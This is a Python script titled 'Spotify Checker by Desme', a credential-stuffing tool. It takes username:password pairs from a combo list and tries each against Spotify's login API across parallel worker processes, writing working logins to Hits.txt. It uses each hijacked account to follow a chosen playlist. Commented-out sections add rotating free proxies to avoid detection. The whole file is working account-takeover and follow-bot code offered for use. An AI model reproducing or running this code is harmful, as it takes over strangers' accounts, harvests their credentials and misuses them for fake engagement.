import requests, platform, random, ctypes
from colorama import init, Fore
import calendar
import re
import datetime
from os import path
import os
from datetime import datetime
from multiprocessing import Pool
from concurrent.futures import ThreadPoolExecutor
 
if platform.system() == 'Windows':
        windows = True
        ctypes.windll.kernel32.SetConsoleTitleW('Spotify Checker by Desme')
else:
        print('Oh, You are not on Windows -> Turning off title bar status changer')
 
class Counter:
    checked = 0
    hits = 0
    retries = 0
    invalid = 0
    error = 0
    cpm = 0
    maxcpm = 0
class Checker:
    timeofstart = ""
    init(convert=True)
 
    def __init__(self):
        self.intro()
        self.AskQuestion()
 
    def intro(self):
        os.system("cls")
        print(Fore.GREEN + """ 
 
  ??????  ??????   ??????  ????????? ???  ?????????   ???    ??????   ??? ?? ??????  ??????   ?? ?????????  ??????  
???    ? ????  ???????  ????  ??? ?????????   ?  ???  ???   ???? ??  ???? ?????   ? ???? ??   ????? ??   ? ??? ? ???
? ????   ???? ????????  ???? ???? ??????????? ?   ??? ???   ???    ? ????????????   ???    ? ?????? ????   ??? ??? ?
  ?   ?????????? ????   ???? ???? ? ????????  ?   ? ?????   ???? ??????? ??? ???  ? ???? ??????? ?? ???  ? ???????  
????????????? ?  ?? ???????  ???? ? ????????      ? ?????   ? ????? ????????????????? ????? ????? ????????????? ????
? ??? ? ????? ?  ?? ??????   ? ??   ??   ? ?       ?????    ? ?? ?  ? ? ??????? ?? ?? ?? ?  ?? ?? ???? ?? ?? ?? ????
? ??  ? ??? ?       ? ? ??     ?     ? ? ?       ??? ???      ?  ?    ? ??? ? ? ?  ?  ?  ?   ? ?? ?? ? ?  ?  ?? ? ??
?  ?  ?  ??       ? ? ? ?    ?       ? ? ? ?     ? ? ??     ?         ?  ?? ?   ?   ?        ? ?? ?    ?     ??   ? 
      ?               ? ?            ?           ? ?        ? ?       ?  ?  ?   ?  ?? ?      ?  ?      ?  ?   ?     
                                                 ? ?        ?                       ?                              
\n""")
 
 
    # def getProxyType(self):
    #     while True:
    #         proxyType = int(input(Fore.GREEN + "What type of proxies do you want to use?\n[1] HTTP\n[2] SOCKS4\n[3] SOCKS5\n"))
    #         if proxyType == 1 or proxyType == 2 or proxyType == 3:
    #             break
    #     return proxyType
    
    # def getProxies(self, proxyType):
    #     http_api = "https://api.proxyscrape.com/?request=getproxies&proxytype=http&timeout=10000&country=all&ssl=all&anonymity=all"
    #     socks4_api = "https://api.proxyscrape.com/?request=getproxies&proxytype=socks4&timeout=10000&country=all"
    #     socks5_api = "https://api.proxyscrape.com/?request=getproxies&proxytype=socks5&timeout=10000&country=all"
    #     if proxyType == 1:
    #         proxy = requests.get(http_api)
    #         proxies = proxy.text.split("\r\n")
    #         print(Fore.GREEN + f"Loaded {len(proxies)} HTTP Proxies")
    #         return proxies
    #     elif proxyType == 2:
    #         proxy = requests.get(socks4_api)
    #         proxies = proxy.text.split("\r\n")
    #         print(Fore.GREEN + f"Loaded {len(proxies)} Socks4 Proxies")
    #         return proxies
    #     elif proxyType == 3:
    #         proxy = requests.get(socks5_api)
    #         proxies = proxy.text.split("\r\n")
    #         print(Fore.GREEN + f"Loaded {len(proxies)} Socks5 Proxies")
    #         return proxies
 
    def getCombo(self):
        combo = []
        with open("combo.txt") as f:
            for line in f:
                line = line.replace("\n", "")
                line = line.split(":") # username = [0], pass = [1]
                combo.append(line)
        return combo
 
    def fileservice(self, file, text):
        self.file = file
        self.text = text
        myfile = open(self.file, "a")
        myfile.write(self.text + "\n")
        myfile.close()
 
    @staticmethod
    def getCSRF():
        url = "https://accounts.spotify.com/en/login?continue=https:%2F%2Fwww.spotify.com%2Fuk%2Faccount%2Foverview%2F"
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.80 Safari/537.36",
            "Pragma": "no-cache",
            "Accept": "*/*"
        }
 
        try:
            r = requests.get(url, headers=headers)
            csrf = r.cookies["csrf_token"]
            return csrf
        except:
            Counter.retries += 1
            Checker.getCSRF()
    
    # def Use_Proxies(self):
    #     choice = input("Do you want to use proxies? (y/n)\n")
    #     if choice == "y":
    #         return True
    #     elif choice == "n":
    #         return False
    #     else:
    #         print("Error, please only use y/n")
 
    def CheckAccountProxyless(self, combo):
        csrf = self.getCSRF()
        
      #  use_proxies = self.Use_Proxies()
 
        
        user = combo[0]
        password = combo[1]
 
 
        login_url = "https://accounts.spotify.com/api/login"
 
        login_headers = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.80 Safari/537.36",
                "Pragma": "no-cache",
                "Accept": "*/*"
            }
        login_cookies= {
                "__bon": "MHwwfC0xNDAxNTMwNDkzfC01ODg2NDI4MDcwNnwxfDF8MXwx",
                "csrf_token": csrf
            }
 
        payload = {"remember": "true", "username": user, "password": password, "csrf_token": csrf}
            
 
        session = requests.Session()
        ctypes.windll.kernel32.SetConsoleTitleW(f"Spotify Checker by Desme | Checked[{Counter.checked}/{len(combo)}]  | Fails: {Counter.invalid} Hits : {Counter.hits} | Retries: {Counter.retries} Errors: {Counter.error}")
        try:
            req = session.post(login_url, cookies=login_cookies, headers=login_headers, data=payload)
            if "error\":\"errorInvalidCredentials" in req.text:
                Counter.invalid += 1
                print(Fore.RED + f"{user}:{password}")
            elif "displayName" in req.text:
                Counter.hits += 1
                print(Fore.GREEN + f"{user}:{password}")
                self.Follow(req.cookies, self.id)
                self.fileservice("Hits.txt", f"{user}:{password}")
    
            else:
                Counter.error += 1
                
        except Exception as f:
            print(f)
            Counter.retries += 1
 
    # 'def CheckAccountProxies(self, proxyType, combo, line_number, proxies):
    #     csrf = self.getCSRF()
 
    #     user = combo[line_number][0]
    #     password = combo[line_number][1]
 
        
    #     login_url = "https://accounts.spotify.com/api/login"
 
    #     login_headers = {
    #             "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.80 Safari/537.36",
    #             "Pragma": "no-cache",
    #             "Accept": "*/*"
    #         }
    #     login_cookies= {
    #             "__bon": "MHwwfC0xNDAxNTMwNDkzfC01ODg2NDI4MDcwNnwxfDF8MXwx",
    #             "csrf_token": csrf
    #         }
 
    #     payload = {"remember": "true", "username": user, "password": password, "csrf_token": csrf}
 
 
    #     session = requests.Session()
 
    #     try:
    #         proxy = random.choice(proxies)
    #         if proxyType == 1:
    #             req = session.post(login_url, cookies=login_cookies, headers=login_headers, data=payload, proxies={'http':f"{proxy}",  'https':f"{proxy}"}, timeout=10)
    #         elif proxyType == 2:
    #             req = session.post(login_url, cookies=login_cookies, headers=login_headers, data=payload, proxies={'http':f"socks4://{proxy}",  'https':f"socks4://{proxy}"}, timeout=10)
    #         elif proxyType == 3:
    #             req = session.post(login_url, cookies=login_cookies, headers=login_headers, data=payload, proxies={'http':f"socks5://{proxy}",  'https':f"socks5://{proxy}"}, timeout=10)            
            
    #         if "error\":\"errorInvalidCredentials" in req.text:
    #             Counter.invalid += 1
    #             print(Fore.RED + f"{user}:{password}")
    #         elif "displayName" in req.text:
    #             Counter.hits += 1
    #             print(Fore.GREEN + f"{user}:{password}")
    #             self.fileservice("Hits.txt", f"{user}:{password}")
    
    #         else:
    #             Counter.error += 1
 
                
    #     except Exception as f:
    #         print(f)
    #         Counter.retries += 1
            
 
    #     except:
    #         Counter.retries += 1
    #         print("retry")'
 
    def Follow(self, cookies, id):
        token = self.getToken(cookies)
        url = f"https://api.spotify.com/v1/playlists/{id}/followers"
        headers = {"Content-Type": "text/plain;charset=UTF-8",
                 "Authorization": f"Bearer {token}"   
        }
        post_data = "{\"public\":false}"
 
        follow_request = requests.put(url, headers=headers, cookies=cookies, json=post_data)
        if follow_request.status_code == 200:
            print(Fore.GREEN + "Follower successfully sent")
        else:
            print(Fore.RED + "Follower was unsuccessfully")
 
    def getToken(self, cookies):
        url = "https://open.spotify.com/access_token?reason=transport&productType=web_player"
        headers = {
            "App-Platform": "WebPlayer",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.117 Safari/537.36",
            "Spotify-App-Version": "1579311882"
        }
        result = requests.get(url, headers=headers, cookies=cookies).json()
        token = result["accessToken"]
        return token
 
    def AskQuestion(self):
        self.id = input("What is the ID of the playlist you want to follow bot?: ")
 
if __name__ == "__main__":
    spotify = Checker()
    combo = spotify.getCombo()
    threads = int(input("How many threads do you want to use?: "))
    with Pool(threads) as p:
        for _ in p.imap_unordered(spotify.CheckAccountProxyless, combo):
            pass
    
